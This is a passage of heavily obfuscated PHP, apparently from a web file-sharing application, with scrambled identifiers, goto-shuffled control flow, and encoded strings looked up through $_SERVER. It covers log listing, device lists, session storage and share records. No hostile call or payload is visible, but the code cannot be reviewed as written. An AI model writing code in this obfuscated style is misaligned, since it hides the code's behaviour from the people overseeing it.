&$BÅ²¼Øäøá) { $Aë˜Œ‘ª•™ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!isset($A‰ôĞ‚À‚[$Aë˜Œ‘ª•™[2123]])) { return; } $cïº÷—ùäˆ = json_decode($A‰ôĞ‚À‚[$Aë˜Œ‘ª•™[2123]], !0); foreach ($cïº÷—ùäˆ as $eâÁ±‡¢ëİ) { try { $CÉøŞ¤Øºã = IO::infoFull($eâÁ±‡¢ëİ[$Aë˜Œ‘ª•™[76]]); } catch (Exception $D˜½ùÙ) { continue; } $A‰ôĞ‚À‚[$Aë˜Œ‘ª•™[76]] = $eâÁ±‡¢ëİ[$Aë˜Œ‘ª•™[76]]; $BÅ²¼Øäøá[] = $A‰ôĞ‚À‚[$Aë˜Œ‘ª•™[397]] = $CÉøŞ¤Øºã[$Aë˜Œ‘ª•™[397]]; $BÅ²¼Øäøá[] = $A‰ôĞ‚À‚[$Aë˜Œ‘ª•™[1936]] = $CÉøŞ¤Øºã[$Aë˜Œ‘ª•™[492]]; break; } return $A‰ôĞ‚À‚; } private function getSourceList(&$d…å¿å†ğ) { $Féƒ–ÛÕ«¬ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $c‡®¡¥¯ì = array(); foreach ($d…å¿å†ğ as $cÊ»¦Çğ¸ğ => $bÏÓ¬×ŠĞã) { goto AŒ²±‡·¥; cŸ¥Ş†¤Æê: $c‡®¡¥¯ì[] = $F˜‡‘†³ …[$Féƒ–ÛÕ«¬[397]]; $c‡®¡¥¯ì[] = $F˜‡‘†³ …[$Féƒ–ÛÕ«¬[1936]]; if ($F˜‡‘†³ …[$Féƒ–ÛÕ«¬[29]] == $Féƒ–ÛÕ«¬[545]) { $c‡®¡¥¯ì[] = $F˜‡‘†³ …[$Féƒ–ÛÕ«¬[445]][$Féƒ–ÛÕ«¬[1076]]; $c‡®¡¥¯ì[] = $F˜‡‘†³ …[$Féƒ–ÛÕ«¬[445]][$Féƒ–ÛÕ«¬[1077]]; } goto eÍç–àËÚ³; AŒ²±‡·¥: $F˜‡‘†³ … = json_decode($bÏÓ¬×ŠĞã[$Féƒ–ÛÕ«¬[445]], !0); if ($bÏÓ¬×ŠĞã[$Féƒ–ÛÕ«¬[29]] == $Féƒ–ÛÕ«¬[1690]) { $F˜‡‘†³ … = $this->descZipDownload($F˜‡‘†³ …, $c‡®¡¥¯ì); $d…å¿å†ğ[$cÊ»¦Çğ¸ğ][$Féƒ–ÛÕ«¬[445]] = json_encode($F˜‡‘†³ …); continue; } if (strpos($bÏÓ¬×ŠĞã[$Féƒ–ÛÕ«¬[29]], $Féƒ–ÛÕ«¬[1937]) !== 0) { if (!isset($F˜‡‘†³ …[$Féƒ–ÛÕ«¬[76]]) || strpos($bÏÓ¬×ŠĞã[$Féƒ–ÛÕ«¬[29]], $Féƒ–ÛÕ«¬[2124]) !== 0) { continue; } try { $dßª°·‘† = IO::infoFull($F˜‡‘†³ …[$Féƒ–ÛÕ«¬[76]]); } catch (Exception $FÅ•´ƒÀ³Ö) { continue; } $c‡®¡¥¯ì[] = $F˜‡‘†³ …[$Féƒ–ÛÕ«¬[397]] = $dßª°·‘†[$Féƒ–ÛÕ«¬[397]]; $c‡®¡¥¯ì[] = $F˜‡‘†³ …[$Féƒ–ÛÕ«¬[1936]] = $dßª°·‘†[$Féƒ–ÛÕ«¬[492]]; $d…å¿å†ğ[$cÊ»¦Çğ¸ğ][$Féƒ–ÛÕ«¬[445]] = json_encode($F˜‡‘†³ …); continue; } goto cŸ¥Ş†¤Æê; eÍç–àËÚ³: if ($F˜‡‘†³ …[$Féƒ–ÛÕ«¬[29]] == $Féƒ–ÛÕ«¬[1944]) { $c‡®¡¥¯ì[] = $F˜‡‘†³ …[$Féƒ–ÛÕ«¬[445]][$Féƒ–ÛÕ«¬[397]]; } goto b‹˜ïèªñã; b‹˜ïèªñã: } if (!$c‡®¡¥¯ì) { return array(); } return Model($Féƒ–ÛÕ«¬[813])->sourceListInfo($c‡®¡¥¯ì, !0); } private function logList($cÈ­“šÕ©§) { goto BØ¤ØŠˆ“Ÿ; EˆÚØéƒÄõ: return $e»²ÌÍƒé±; goto B¸É®ôµÜÒ; FŠ®ã¸Öô°: $díÅï‚¡¨… = array(); foreach ($cÈ­“šÕ©§ as $EƒéÚº’­§ => $EÒîåóõœ’) { goto b—Ì÷„«é; aËÏç–µ £: unset($EÒîåóõœ’[$E›Ô¢•µÚ[2127]]); $e»²ÌÍƒé±[] = $EÒîåóõœ’; goto Aï“º’; EæÚˆ­İ…©: $EÒîåóõœ’[$E›Ô¢•µÚ[28]] = isset($aÉßÌÈß¼[$E›Ô¢•µÚ[28]]) ? $aÉßÌÈß¼[$E›Ô¢•µÚ[28]] : LNG($E›Ô¢•µÚ[2121]); $EÒîåóõœ’[$E›Ô¢•µÚ[1984]] = isset($aÉßÌÈß¼[$E›Ô¢•µÚ[1984]]) ? $aÉßÌÈß¼[$E›Ô¢•µÚ[1984]] : $E›Ô¢•µÚ[33]; $EÒîåóõœ’[$E›Ô¢•µÚ[1451]] = isset($d–öµÙ›–[$eÏÏš½§œ]) ? $d–öµÙ›–[$eÏÏš½§œ] : $E”Íø—ìÌØ; goto e‡Ñœø»æ°; e‡Ñœø»æ°: $EÒîåóõœ’[$E›Ô¢•µÚ[1881]] = $aÉßÌÈß¼; $B»¶†”³ = json_decode($EÒîåóõœ’[$E›Ô¢•µÚ[445]], !0); $EÒîåóõœ’[$E›Ô¢•µÚ[2118]] = isset($B»¶†”³[$E›Ô¢•µÚ[2118]]) ? $B»¶†”³[$E›Ô¢•µÚ[2118]] : $E›Ô¢•µÚ[33]; goto BÆÇŒ–¯ƒË; b—Ì÷„«é: $eÏÏš½§œ = $EÒîåóõœ’[$E›Ô¢•µÚ[29]]; $aÉßÌÈß¼ = isset($B‘©íñ–¦º[$EÒîåóõœ’[$E›Ô¢•µÚ[1550]]]) ? $B‘©íñ–¦º[$EÒîåóõœ’[$E›Ô¢•µÚ[1550]]] : !1; $E”Íø—ìÌØ = strpos($eÏÏš½§œ, $E›Ô¢•µÚ[2125]) === 0 ? LNG($E›Ô¢•µÚ[2126]) : LNG($E›Ô¢•µÚ[2121]); goto EæÚˆ­İ…©; BÆÇŒ–¯ƒË: $this->ipAddress($EÒîåóõœ’); if (strpos($eÏÏš½§œ, $E›Ô¢•µÚ[1937]) === 0 || isset($B»¶†”³[$E›Ô¢•µÚ[1936]])) { goto AË³ÓØùóÇ; AË³ÓØùóÇ: $B»¶†”³[$E›Ô¢•µÚ[85]] = $e” Ô­âê”[$B»¶†”³[$E›Ô¢•µÚ[397]]]; $B»¶†”³[$E›Ô¢•µÚ[1949]] = $e” Ô­âê”[$B»¶†”³[$E›Ô¢•µÚ[1936]]]; if ($B»¶†”³[$E›Ô¢•µÚ[29]] == $E›Ô¢•µÚ[545]) { $B»¶†”³[$E›Ô¢•µÚ[445]][$E›Ô¢•µÚ[1076]] = $e” Ô­âê”[$B»¶†”³[$E›Ô¢•µÚ[445]][$E›Ô¢•µÚ[1076]]]; $B»¶†”³[$E›Ô¢•µÚ[445]][$E›Ô¢•µÚ[1077]] = $e” Ô­âê”[$B»¶†”³[$E›Ô¢•µÚ[445]][$E›Ô¢•µÚ[1077]]]; } goto E…ŒŞŒÃ»«; E…ŒŞŒÃ»«: if ($B»¶†”³[$E›Ô¢•µÚ[29]] == $E›Ô¢•µÚ[1944]) { $B»¶†”³[$E›Ô¢•µÚ[445]][$E›Ô¢•µÚ[397]] = $e” Ô­âê”[$B»¶†”³[$E›Ô¢•µÚ[445]][$E›Ô¢•µÚ[397]]]; } if ($B»¶†”³[$E›Ô¢•µÚ[29]] == $E›Ô¢•µÚ[1685]) { $B»¶†”³[$E›Ô¢•µÚ[1949]] = $B»¶†”³[$E›Ô¢•µÚ[85]]; $B»¶†”³[$E›Ô¢•µÚ[1936]] = $B»¶†”³[$E›Ô¢•µÚ[1949]][$E›Ô¢•µÚ[397]]; $B»¶†”³[$E›Ô¢•µÚ[85]] = !1; $B»¶†”³[$E›Ô¢•µÚ[397]] = $E›Ô¢•µÚ[33]; } if ($B»¶†”³[$E›Ô¢•µÚ[85]] && $B»¶†”³[$E›Ô¢•µÚ[85]][$E›Ô¢•µÚ[406]] == $E›Ô¢•µÚ[1192]) { $díÅï‚¡¨…[] = $EÒîåóõœ’[$E›Ô¢•µÚ[395]]; unset($cÈ­“šÕ©§[$EƒéÚº’­§]); continue; } goto BïÇËŠãõ„; BïÇËŠãõ„: if ($B»¶†”³[$E›Ô¢•µÚ[1949]] && $B»¶†”³[$E›Ô¢•µÚ[1949]][$E›Ô¢•µÚ[406]] == $E›Ô¢•µÚ[1192]) { $díÅï‚¡¨…[] = $EÒîåóõœ’[$E›Ô¢•µÚ[395]]; unset($cÈ­“šÕ©§[$EƒéÚº’­§]); continue; } goto F‚ß–†„¯Ğ; F‚ß–†„¯Ğ: } $EÒîåóõœ’[$E›Ô¢•µÚ[445]] = $B»¶†”³; goto aËÏç–µ £; Aï“º’: } $this->clearSystemPathLog($díÅï‚¡¨…); goto EˆÚØéƒÄõ; BØ¤ØŠˆ“Ÿ: $E›Ô¢•µÚ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $Eé’¶‡âãÖ = array_to_keyvalue($cÈ­“šÕ©§, $E›Ô¢•µÚ[33], $E›Ô¢•µÚ[1550]); $B‘©íñ–¦º = Model($E›Ô¢•µÚ[532])->userListInfo(array_unique($Eé’¶‡âãÖ)); goto C¸æß´õ‚ò; C¸æß´õ‚ò: $e” Ô­âê” = $this->getSourceList($cÈ­“šÕ©§); $d–öµÙ›– = $this->typeAll(); $e»²ÌÍƒé± = array(); goto FŠ®ã¸Öô°; B¸É®ôµÜÒ: } private function clearSystemPathLog($C´‚‚«Öô±) { $AˆÏ¿Š¨ÍÔ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (count($C´‚‚«Öô±) == 0) { return; } $cáÎ»©©À = array($AˆÏ¿Š¨ÍÔ[395] => array($AˆÏ¿Š¨ÍÔ[7], array_unique($C´‚‚«Öô±))); $this->where($cáÎ»©©À)->delete(); } public function deviceList($a’ùÎ¢è¸â, $f©âí»Ë¡µ = 0) { $d›ÓÙ”¼Õ‡ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $fËãôİ…Ä— = array($d›ÓÙ”¼Õ‡[1550] => $a’ùÎ¢è¸â, $d›ÓÙ”¼Õ‡[194] => array($d›ÓÙ”¼Õ‡[994], $f©âí»Ë¡µ), $d›ÓÙ”¼Õ‡[29] => $d›ÓÙ”¼Õ‡[1659]); $eâŸà™ƒ“ = array(); $B„ÖÊÙ­Æ = $this->field($d›ÓÙ”¼Õ‡[2128])->where($fËãôİ…Ä—)->order($d›ÓÙ”¼Õ‡[1947])->limit(50)->select(); foreach ($B„ÖÊÙ­Æ as $BİòĞè¸ÁŸ => $FÚïÌŞç´ù) { goto FÜ­˜‚áø; FÜ­˜‚áø: if ($BİòĞè¸ÁŸ > 0 && abs($FÚïÌŞç´ù[$d›ÓÙ”¼Õ‡[194]] - $B„ÖÊÙ­Æ[$BİòĞè¸ÁŸ - 1][$d›ÓÙ”¼Õ‡[194]]) < 5) { continue; } $b‘“ƒé¼ğ = json_decode($FÚïÌŞç´ù[$d›ÓÙ”¼Õ‡[445]], !0); $FÚïÌŞç´ù[$d›ÓÙ”¼Õ‡[2118]] = isset($b‘“ƒé¼ğ[$d›ÓÙ”¼Õ‡[2118]]) ? $b‘“ƒé¼ğ[$d›ÓÙ”¼Õ‡[2118]] : $d›ÓÙ”¼Õ‡[33]; goto EÒ½ó¼Í; EÒ½ó¼Í: unset($b‘“ƒé¼ğ[$d›ÓÙ”¼Õ‡[2118]]); $c¥·»‘¦Óí = $this->deviceType($b‘“ƒé¼ğ[$d›ÓÙ”¼Õ‡[1938]]); if (isset($eâŸà™ƒ“[$c¥·»‘¦Óí])) { continue; } goto e¢ğ‰Ğ…â•; e¢ğ‰Ğ…â•: $this->ipAddress($FÚïÌŞç´ù); $FÚïÌŞç´ù[$d›ÓÙ”¼Õ‡[445]] = $b‘“ƒé¼ğ; $eâŸà™ƒ“[$c¥·»‘¦Óí] = $FÚïÌŞç´ù; goto A…Ì½ã¿ãŠ; A…Ì½ã¿ãŠ: } return array_values($eâŸà™ƒ“); } public function deviceType($c¶ƒÀÙ¡¿‰) { return $c¶ƒÀÙ¡¿‰; } } goto B‹—ƒ­Æ™ƒ; dÜ¼Ö«»êò: class SessionModel extends ModelBase { protected $tableName = "\163\171\163\x74\145\x6d\137\x73\x65\x73\x73\x69\157\156"; public function get($f¤‘ÄÁé»–) { $CçÆæã‘ğ¾ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $d’º ¼‹Şæ = $this->where(array($CçÆæã‘ğ¾[1848] => $f¤‘ÄÁé»–))->find(); if (!is_array($d’º ¼‹Şæ)) { return !1; } return $d’º ¼‹Şæ[$CçÆæã‘ğ¾[736]]; } public function set($B’ Ñ·£–, $E¥«ö‚‰êó, $D‡ØšÔÁßÃ = 3600) { $eÖÜ¿†™È =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $EÓéÚ±¿§ = array($eÖÜ¿†™È[1848] => $B’ Ñ·£–, $eÖÜ¿†™È[1757] => $E¥«ö‚‰êó, $eÖÜ¿†™È[1849] => $D‡ØšÔÁßÃ + time()); if (Session::get($eÖÜ¿†™È[1850])) { $EÓéÚ±¿§[$eÖÜ¿†™È[1550]] = Session::get($eÖÜ¿†™È[1850]); } else { $EÓéÚ±¿§[$eÖÜ¿†™È[1550]] = 0; } if ($this->get($B’ Ñ·£–)) { return $this->where(array($eÖÜ¿†™È[1848] => $B’ Ñ·£–))->save($EÓéÚ±¿§); } else { return $this->add($EÓéÚ±¿§, array(), !0); } } public function remove($FåÆ‚øÒ¸ä) { return $this->where(array($_SERVER[Ôğ—¤Šµˆ˜ñ£][1848] => $FåÆ‚øÒ¸ä))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Ôğ—¤Šµˆ˜ñ£][1851] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\x68\141\162\x65"; protected $dataAuto = array(array("\x6d\157\x64\x69\x66\171\124\x69\155\145", "\x74\151\x6d\x65", "\151\156\x73\x65\x72\164\54\165\160\144\141\x74\145", "\x66\x75\x6e\x63\164\x69\157\156"), array("\143\162\x65\141\164\145\x54\151\155\x65", "\x74\151\155\145", "\151\156\163\145\162\164", "\146\165\x6e\x63\x74\x69\x6f\x6e"), array("\x6f\x70\x74\151\157\156\163", '', "\x69\156\x73\x65\x72\164\x2c\165\160\x64\x61\164\x65\x2c\163\145\154\x65\x63\x74", "\x6a\163\157\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($dÇÂº•ÊÉÃ) { $B«õ˜ò¸ôÜ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $fÚçßá­à = isset($dÇÂº•ÊÉÃ[0]) ? $dÇÂº•ÊÉÃ[0] : !1; return array($B«õ˜ò¸ôÜ[1852] => array(USER_ID, $B«õ˜ò¸ôÜ[1853]), $B«õ˜ò¸ôÜ[1795] => array($fÚçßá­à, $B«õ˜ò¸ôÜ[1854])); } protected function listSimple() { $BâÄ©ë– = array($_SERVER[Ôğ—¤Šµˆ˜ñ£][1550] => USER_ID); $D˜éâ›ö = $this->field($this->fieldList)->where($BâÄ©ë–)->select(); return $D˜éâ›ö ? $D˜éâ›ö : array(); } protected function getInfo($E˜½àÕÑÂ‹, $a½š¢¤Â‹² = false) { $CôÙ¹â½Ü =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($a½š¢¤Â‹²) { return $this->_getShareInfo(array($CôÙ¹â½Ü[482] => $E˜½àÕÑÂ‹)); } $c­Úù¡¦Çµ = $this->cacheFunctionGet($CôÙ¹â½Ü[1797], $E˜½àÕÑÂ‹); return $c­Úù¡¦Çµ; } public function getInfoByHash($a™Êó¯ğöÜ) { return $this->_getShareInfo(array($_SERVER[Ôğ—¤Šµˆ˜ñ£][484] => $a™Êó¯ğöÜ)); } public function getInfoByPath($b³­¢ó²†¥) { $B¸¦ì­ùï¤ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $f•ÛêøÆî = array($B¸¦ì­ùï¤[1550] => USER_ID, $B¸¦ì­ùï¤[397] => $b³­¢ó²†¥); return $this->_getShareInfo($f•ÛêøÆî); } public function getInfoBySourcePath($c–ä£½Ä×î) { $EİÔ°ö™Ê¿ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $E§™ÑÙ÷¼à = array($EİÔ°ö™Ê¿[1550] => USER_ID, $EİÔ°ö™Ê¿[1092] => $c–ä£½Ä×î); return $this->_getShareInfo($E§™ÑÙ÷¼à); } private function _getShareInfo($CŠ‰ç†ŸÙÜ) { goto aøÖ’¡¼…Ú; aøÖ’¡¼…Ú: $E‰ÁµƒÄÚ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $cãÍ¦¨Õ©ó = $this->where($CŠ‰ç†ŸÙÜ)->find(); if (!$cãÍ¦¨Õ©ó) { return !1; } goto bñ‘™ã’¯ô; bñ‘™ã’¯ô: $CŠ‰ç†ŸÙÜ = array($E‰ÁµƒÄÚ[482] => $cãÍ¦¨Õ©ó[$E‰ÁµƒÄÚ[482]]); $DÂõÜ‰á„Ô = $E‰ÁµƒÄÚ[1855]; $cÕò½·‰‚˜ = Model($E‰ÁµƒÄÚ[590])->order($E‰ÁµƒÄÚ[395])->field($DÂõÜ‰á„Ô)->where($CŠ‰ç†ŸÙÜ)->select(); goto DøÁ×ÊØ; DøÁ×ÊØ: if ($cãÍ¦¨Õ©ó[$E‰ÁµƒÄÚ[397]] == $E‰ÁµƒÄÚ[191]) { $cãÍ¦¨Õ©ó[$E‰ÁµƒÄÚ[85]] = IO::info($cãÍ¦¨Õ©ó[$E‰ÁµƒÄÚ[1092]]); } else { $cãÍ¦¨Õ©ó[$E‰ÁµƒÄÚ[85]] = Model($E‰ÁµƒÄÚ[1227])->pathInfo($cãÍ¦¨Õ©ó[$E‰ÁµƒÄÚ[397]]); } $cãÍ¦¨Õ©ó[$E‰ÁµƒÄÚ[1856]] = $cÕò½·‰‚˜; return $cãÍ¦¨Õ©ó; goto e‡àÚŠ“—È; e‡àÚŠ“—È: } protected function getInfoAuth($E¥‰Öº³Äå) { $b·¤”¿–‚† =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $c¤¿´„­‘â = $this->getInfo($E¥‰Öº³Äå); $c¤¿´„­‘â[$b·¤”¿–‚†[408]] = Model($b·¤”¿–‚†[496])->authMake($c¤¿´„­‘â[$b·¤”¿–‚†[1856]]); return $c¤¿´„­‘â; } protected function listData($E³±ëÛôì› = null, $Dª Å‚©õÜ = 300) { $FëÒÔ˜µÏÕ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $FÆ‰ãÂß…ˆ = array(array($FëÒÔ˜µÏÕ[487] => array($FëÒÔ˜µÏÕ[992], 0), $FëÒÔ˜µÏÕ[489] => array($FëÒÔ˜µÏÕ[992], 0), $FëÒÔ˜µÏÕ[1857] => $FëÒÔ˜µÏÕ[1811])); if ($E³±ëÛôì› == $FëÒÔ˜µÏÕ[1858]) { $FÆ‰ãÂß…ˆ = array($FëÒÔ˜µÏÕ[487] => 1); } else { if ($E³±ëÛôì› == $FëÒÔ˜µÏÕ[1077]) { $FÆ‰ãÂß…ˆ = array($FëÒÔ˜µÏÕ[489] => 1); } } $FÆ‰ãÂß…ˆ[$FëÒÔ˜µÏÕ[1550]] = USER_ID; $C¨Ã±˜Šª = $this->where($FÆ‰ãÂß…ˆ)->selectPage($Dª Å‚©õÜ); return $C¨Ã±˜Šª; } protected function listToMe($aÛ¶ÒŠëŒ¤ = 300) { goto F›÷³îÖ¼; F›÷³îÖ¼: $D„¥¶µÓ›× =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $e³êÔºÃ©á = Model($D„¥¶µÓ›×[1859])->userGroupParents(USER_ID); $CîºÓÜìœ = array($D„¥¶µÓ›×[574] => SourceModel::TYPE_USER, $D„¥¶µÓ›×[498] => USER_ID); goto C®æÊÊß—; cëÀÛÌÌ®×: if (!$BŠéêöÎ²à) { return $a˜»·’›ƒ; } $bÖõÕ»¼ì = $D„¥¶µÓ›×[1860]; $CîºÓÜìœ = array($D„¥¶µÓ›×[482] => array($D„¥¶µÓ›×[413], array_keys($BŠéêöÎ²à)), $D„¥¶µÓ›×[1550] => array($D„¥¶µÓ›×[994], $D„¥¶µÓ›×[191])); goto E÷‰´°†¶œ; D‰ÍëÆ„ÊÓ: $Eâ†òƒØÜ = array($D„¥¶µÓ›×[1861] => $eİöõÆ­™, $D„¥¶µÓ›×[1862] => $a˜»·’›ƒ[$D„¥¶µÓ›×[364]]); return $Eâ†òƒØÜ; goto fÕÅ¤©¯†Ó; E÷‰´°†¶œ: $eİöõÆ­™ = $this->field($bÖõÕ»¼ì)->where($CîºÓÜìœ)->select(); foreach ($eİöõÆ­™ as $b‡²ˆæÒ³” => &$A©óËç¡…â) { $A©óËç¡…â[$D„¥¶µÓ›×[1856]] = $BŠéêöÎ²à[$A©óËç¡…â[$D„¥¶µÓ›×[482]]]; } unset($A©óËç¡…â); goto D‰ÍëÆ„ÊÓ; C®æÊÊß—: if ($e³êÔºÃ©á) { $CîºÓÜìœ = array(array($D„¥¶µÓ›×[574] => SourceModel::TYPE_USER, $D„¥¶µÓ›×[498] => USER_ID), array($D„¥¶µÓ›×[574] => SourceModel::TYPE_GROUP, $D„¥¶µÓ›×[498] => array($D„¥¶µÓ›×[7], $e³êÔºÃ©á)), $D„¥¶µÓ›×[1857] => $D„¥¶µÓ›×[1811]); } $a˜»·’›ƒ = Model($D„¥¶µÓ›×[590])->where($CîºÓÜìœ)->selectPage($aÛ¶ÒŠëŒ¤); $BŠéêöÎ²à = array_to_keyvalue_group($a˜»·’›ƒ[$D„¥¶µÓ›×[367]], $D„¥¶µÓ›×[482]); goto cëÀÛÌÌ®×; fÕÅ¤©¯†Ó: } protected function shareAdd($AóÚìËÓä¦, $cõÌ¡•†¨†) { $bšä¨Ã¦™ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $f¦šó¼Šò = $this->_addShareData($AóÚìËÓä¦, $cõÌ¡•†¨†); if (!empty($cõÌ¡•†¨†[$bšä¨Ã¦™[1863]])) { $this->_shareAuthSet($f¦šó¼Šò, $cõÌ¡•†¨†[$bšä¨Ã¦™[1863]]); } $this->shareEventAdd($AóÚìËÓä¦, $cõÌ¡•†¨†, $bšä¨Ã¦™[1080]); return $f¦šó¼Šò; } protected function shareAddSystem($E¼Õ¼‹ôËÅ, $eŞº¢†…œÌ) { $CÜÈæ‚‰’ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $DÂë¡„øªÂ = $this->_addShareData($E¼Õ¼‹ôËÅ, $eŞº¢†…œÌ, $CÜÈæ‚‰’[1192]); $this->_shareAuthSet($DÂë¡„øªÂ, $eŞº¢†…œÌ[$CÜÈæ‚‰’[1863]]); return $DÂë¡„øªÂ; } private function shareEventAdd($eÌÔ»ÃÀ˜­, $bŠ¤ãÆÙ­Û, $e‹™õïöË = "\141\144\x64") { goto Aåòï°À§„; a§ˆÃ®•˜Ö: Model($A“†ÜâÛŠ[558])->eventShare($eÌÔ»ÃÀ˜­, $E‚¹¾’‹òò); return; goto a•¼ÓÂ•éŒ; bìÕ˜ç…‚ù: if ($CİÛôƒ´»‹[$A“†ÜâÛŠ[487]] == $A“†ÜâÛŠ[87] && $bŠ¤ãÆÙ­Û[$A“†ÜâÛŠ[487]] == $A“†ÜâÛŠ[191]) { $E‚¹¾’‹òò = $A“†ÜâÛŠ[1867]; } if ($CİÛôƒ´»‹[$A“†ÜâÛŠ[489]] == $A“†ÜâÛŠ[191] && $bŠ¤ãÆÙ­Û[$A“†ÜâÛŠ[489]] == $A“†ÜâÛŠ[87]) { $E‚¹¾’‹òò = $A“†ÜâÛŠ[1865]; } if ($CİÛôƒ´»‹[$A“†ÜâÛŠ[489]] == $A“†ÜâÛŠ[87] && $bŠ¤ãÆÙ­Û[$A“†ÜâÛŠ[489]] == $A“†ÜâÛŠ[191]) { $E‚¹¾’‹òò = $A“†ÜâÛŠ[1868]; } goto a§ˆÃ®•˜Ö; f¾áˆ‰Œ: $CİÛôƒ´»‹ = $this->getInfoByPath($eÌÔ»ÃÀ˜­); $E‚¹¾’‹òò = $A“†ÜâÛŠ[1866]; if ($CİÛôƒ´»‹[$A“†ÜâÛŠ[487]] == $A“†ÜâÛŠ[191] && $bŠ¤ãÆÙ­Û[$A“†ÜâÛŠ[487]] == $A“†ÜâÛŠ[87]) { $E‚¹¾’‹òò = $A“†ÜâÛŠ[1864]; } goto bìÕ˜ç…‚ù; Aåòï°À§„: $A“†ÜâÛŠ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$eÌÔ»ÃÀ˜­ || $eÌÔ»ÃÀ˜­ == $A“†ÜâÛŠ[191]) { return; } if ($e‹™õïöË == $A“†ÜâÛŠ[1080]) { if ($bŠ¤ãÆÙ­Û[$A“†ÜâÛŠ[487]] == $A“†ÜâÛŠ[87]) { Model($A“†ÜâÛŠ[558])->eventShare($eÌÔ»ÃÀ˜­, $A“†ÜâÛŠ[1864]); } if ($bŠ¤ãÆÙ­Û[$A“†ÜâÛŠ[489]] == $A“†ÜâÛŠ[87]) { Model($A“†ÜâÛŠ[558])->eventShare($eÌÔ»ÃÀ˜­, $A“†ÜâÛŠ[1865]); } return; } goto f¾áˆ‰Œ; a•¼ÓÂ•éŒ: } private function _addShareData($eÕ–¢ÇÙƒ, $f»¤šÈ…öÏ = array(), $Cİ¸õŒ“Ö = false) { goto bâÅÍ–¨¨¹; Bæ¾™Áš¢: if (!$f»¤šÈ…öÏ[$a‚ù÷ßâ¡÷[1451]]) { $f»¤šÈ…öÏ[$a‚ù÷ßâ¡÷[1451]] = $DĞù—›øÂâ[$a‚ù÷ßâ¡÷[28]]; } $E÷ëÒ„Äõ¿ = array($a‚ù÷ßâ¡÷[1541] => $DÅ¶ß„˜Æ, $a‚ù÷ßâ¡÷[412] => $eÕ–¢ÇÙƒ, $a‚ù÷ßâ¡÷[1451] => $a‚ù÷ßâ¡÷[33], $a‚ù÷ßâ¡÷[487] => 0, $a‚ù÷ßâ¡÷[489] => 0, $a‚ù÷ßâ¡÷[1092] => $a‚ù÷ßâ¡÷[33], $a‚ù÷ßâ¡÷[305] => $a‚ù÷ßâ¡÷[33], $a‚ù÷ßâ¡÷[872] => $a‚ù÷ßâ¡÷[33], $a‚ù÷ßâ¡÷[1870] => 0, $a‚ù÷ßâ¡÷[1871] => 0, $a‚ù÷ßâ¡÷[490] => 0, $a‚ù÷ßâ¡÷[491] => $a‚ù÷ßâ¡÷[33], $a‚ù÷ßâ¡÷[484] => $a‚ù÷ßâ¡÷[33]); $dËÏÎ™³çİ = explode($a‚ù÷ßâ¡÷[47], $a‚ù÷ßâ¡÷[1872]); goto D‹°·’§¤Ÿ; bâÅÍ–¨¨¹: $a‚ù÷ßâ¡÷ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $DÅ¶ß„˜Æ = $Cİ¸õŒ“Ö == $a‚ù÷ßâ¡÷[1192] ? 0 : USER_ID; $AßÊ¦†ŠïÊ = array($a‚ù÷ßâ¡÷[412] => $eÕ–¢ÇÙƒ, $a‚ù÷ßâ¡÷[1541] => $DÅ¶ß„˜Æ); goto AñÚÍöŒ•; D‹°·’§¤Ÿ: foreach ($dËÏÎ™³çİ as $cŠÆÌÊŠ¸) { if (!isset($f»¤šÈ…öÏ[$cŠÆÌÊŠ¸])) { continue; } $E÷ëÒ„Äõ¿[$cŠÆÌÊŠ¸] = $f»¤šÈ…öÏ[$cŠÆÌÊŠ¸]; } $cÚ‹™‹‹ßĞ = $this->add($E÷ëÒ„Äõ¿); $cê‹ëƒÂ® = array($a‚ù÷ßâ¡÷[484] => short_id($cÚ‹™‹‹ßĞ)); goto aÓñ“šË‰©; AñÚÍöŒ•: if ($eÕ–¢ÇÙƒ == 0) { $AßÊ¦†ŠïÊ = array($a‚ù÷ßâ¡÷[1869] => $f»¤šÈ…öÏ[$a‚ù÷ßâ¡÷[1092]], $a‚ù÷ßâ¡÷[1541] => $DÅ¶ß„˜Æ); } if ($Eàİ˜ßÌöİ = $this->where($AßÊ¦†ŠïÊ)->find()) { return $Eàİ˜ßÌöİ[$a‚ù÷ßâ¡÷[482]]; } if ($eÕ–¢ÇÙƒ == 0) { $DĞù—›øÂâ = array($a‚ù÷ßâ¡÷[28] => get_path_this($f»¤šÈ…öÏ[$a‚ù÷ßâ¡÷[76]])); } else { $DĞù—›øÂâ = Model($a‚ù÷ßâ¡÷[813])->sourceInfo($eÕ–¢ÇÙƒ); if (!$DĞù—›øÂâ) { return !1; } } goto Bæ¾™Áš¢; aÓñ“šË‰©: $this->where(array($a‚ù÷ßâ¡÷[481] => $cÚ‹™‹‹ßĞ))->save($cê‹ëƒÂ®); return $cÚ‹™‹‹ßĞ; goto D†—ñÖ¶Ê; D†—ñÖ¶Ê: } private function _shareAuthSet($dè¸çì´ì, $DõíŒŸíáŒ) { goto D„±¡÷İè; D„±¡÷İè: $C×·…‚Ê™© =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!is_array($DõíŒŸíáŒ)) { return !1; } $c™¤‹¥¢‹â = Model($C×·…‚Ê™©[1823]); goto eˆ¡´±©§; eˆ¡´±©§: $c™¤‹¥¢‹â->where(array($C×·…‚Ê™©[482] => $dè¸çì´ì))->delete(); $F—Ê¦…‡Â¾ = array(); foreach ($DõíŒŸíáŒ as 